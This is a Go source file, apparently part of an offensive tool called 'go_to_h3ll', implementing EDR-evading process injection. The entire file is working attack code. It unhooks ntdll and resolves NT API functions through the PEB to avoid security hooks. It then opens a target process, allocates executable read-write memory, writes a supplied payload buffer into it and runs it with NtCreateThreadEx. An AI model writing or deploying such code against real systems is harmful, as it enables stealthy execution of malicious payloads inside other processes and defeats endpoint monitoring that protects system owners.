//this unhooks ntdll + directly loads nt api functions from it

package execution

import (
	"fmt"
	"go_to_h3ll/core"
	"go_to_h3ll/evasion"
	"unsafe"
)

func ProcessInjectionUnhooked(procId uintptr, buf *byte, size uintptr) {

	//load NTAPI functions
	hNtdll, err := core.GetModuleHandleFromPEB("nTdll.dll")
	evasion.UnhookNtdll(hNtdll)
	if err != nil {
		fmt.Println("error getting handle from GetModuleHandleFromPEB")
		return
	}
	ntOpenProcessAddr, err := core.GetProcAddressFromPEB(hNtdll, "NtOpenProcess")
	if err != nil {
		panic(err)
	}
	ntAllocateVirtualMemoryAddr, err := core.GetProcAddressFromPEB(hNtdll, "NtAllocateVirtualMemory")
	if err != nil {
		panic(err)
	}
	//ntProtectVirtualMemoryAddr, err := core.GetProcAddressFromPEB(hNtdll, "NtProtectVirtualMemory")
	if err != nil {
		panic(err)
	}
	ntWriteVirtualMemoryAddr, err := core.GetProcAddressFromPEB(hNtdll, "NtWriteVirtualMemory")
	if err != nil {
		panic(err)
	}
	ntCreateThreadExAddr, err := core.GetProcAddressFromPEB(hNtdll, "NtCreateThreadEx")
	if err != nil {
		panic(err)
	}
	ntWaitForSingleObjectAddr, err := core.GetProcAddressFromPEB(hNtdll, "NtWaitForSingleObject")
	if err != nil {
		panic(err)
	}

	/*--------------------------NTOPENPROCESS--------------------*/
	// Prepare output handle, client ID and object attributes
	var hProc uintptr
	clientId := core.CLIENT_ID{UniqueProcess: uintptr(procId), UniqueThread: 0}
	objAttr := core.InitObjectAttributes(nil, 0x40, 0)
	// Call NtOpenProcess
	status := core.NtOpenProcess(
		ntOpenProcessAddr,
		&hProc,
		0x2A,                              // PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD
		uintptr(unsafe.Pointer(&objAttr)), // OBJECT_ATTRIBUTES (default)
		uintptr(unsafe.Pointer(&clientId)),
	)
	if status == 0 { // STATUS_SUCCESS
		fmt.Printf("NtOpenProcess succeeded, handle=0x%X\n", hProc)
	} else {
		fmt.Printf("NtOpenProcess failed, NTSTATUS=0x%X\n", status)
		return
	}

	regionSize := size
	var baseAddr uintptr = 0
	/*--------------------------NTALLOCATEVIRTUALMEMORY--------------------*/

	status = core.NtAllocateVirtualMemory(
		ntAllocateVirtualMemoryAddr,
		hProc,
		&baseAddr,
		0, // ZeroBits
		&regionSize,
		0x3000, // MEM_COMMIT | MEM_RESERVE
		0x40,   // PAGE_EXECUTE_READWRITE
	)

	if status == 0 { // STATUS_SUCCESS
		fmt.Printf("Allocated memory at 0x%X (size=0x%X)\n", baseAddr, regionSize)
	} else {
		fmt.Printf("NtAllocateVirtualMemory failed, NTSTATUS=0x%X\n", status)
		return
	}
	allocaltedAddr := baseAddr
	var bytesWritten uintptr
	/*--------------------------NTWRITEVIRTUALMEMORY--------------------*/

	status = core.NtWriteVirtualMemory(
		ntWriteVirtualMemoryAddr,
		hProc,                        // handle to target process
		baseAddr,                     //allocated base address from NtAllocateVirtualMemory
		uintptr(unsafe.Pointer(buf)), // pointer to local buffer
		regionSize,                   // size of buffer
		&bytesWritten,
	)

	if status == 0 { // STATUS_SUCCESS
		fmt.Printf("NtWriteVirtualMemory succeeded, wrote %d bytes\n", bytesWritten)
	} else {
		fmt.Printf("NtWriteVirtualMemory failed, NTSTATUS=0x%X\n", status)
	}

	/*--------------------------NTCREATETHREAD--------------------*/
	var hThread uintptr

	status = core.NtCreateThreadEx(
		ntCreateThreadExAddr,
		&hThread,
		0x1FFFFF,       // THREAD_ALL_ACCESS
		0,              // OBJECT_ATTRIBUTES
		hProc,          // handle to target process
		allocaltedAddr, // start address
		0,              // parameter to thread function
		0,              // CreateFlags
		0,              // ZeroBits
		0,              // StackSize
		0,              // MaximumStackSize
		0,              // AttributeList
	)

	if status == 0 { // STATUS_SUCCESS
		fmt.Printf("NtCreateThreadEx succeeded, thread handle=0x%X\n", hThread)
		//Wait for thread to finish
		status = core.NtWaitForSingleObject(
			ntWaitForSingleObjectAddr,
			hThread, // handle returned by NtCreateThreadEx
			false,   // not alertable
			nil,     // infinite wait
		)
		if status == 0 { // STATUS_SUCCESS
			fmt.Printf("WaitForSingleObject status == 0x%X \n", status)
		} else {
			fmt.Printf("WaitForSingleObject failed, NTSTATUS=0x%X\n", status)
			return
		}

	} else {
		fmt.Printf("NtCreateThreadEx failed, NTSTATUS=0x%X\n", status)
	}

}
